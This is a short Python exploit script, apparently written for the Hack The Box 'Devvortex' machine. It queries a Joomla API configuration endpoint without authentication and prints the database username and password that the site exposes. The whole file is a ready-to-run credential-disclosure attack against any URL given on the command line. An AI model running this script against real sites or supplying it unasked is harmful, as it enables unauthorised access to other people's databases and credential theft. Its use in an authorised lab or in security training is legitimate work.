from argparse import ArgumentParser
import requests
import time
import json

parser = ArgumentParser('HTB Devvortex Script')
parser.add_argument('-u', '--url', type=str, required=True, help='Target URL')
args = parser.parse_args()

path = '/api/index.php/v1/config/application?public=true'
useragent = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
}

def check_vuln(target):
    print('[*] Checking if target is vulnerable...')
    check_status = requests.get(target + path, headers=useragent)
    if check_status.status_code == 200:
        print('[+] Target is vulnerable\n[*] Exploiting target...')
        time.sleep(1)
    else:
        print('[-] Target is not vulnerable')
        exit()

def fetch_creds(target):
    send_req = requests.get(target + path, headers=useragent).text
    try:
        req_json = json.loads(send_req)
        if 'data' in req_json and len(req_json['data']) > 0:
            print('[*] Gathering usernames...')
            time.sleep(1)
            for creds in req_json['data']:
                attributes = creds.get('attributes', {})
                username = attributes.get('user')
                password = attributes.get('password')
                
                if username:
                    print(f'[+] Username: {username}')
                if password:
                    print(f'[+] Password: {password}')
    except:
        print('[x] Something went wrong...')
        exit()

if __name__ == '__main__':
    check_vuln(args.url)
    fetch_creds(args.url)
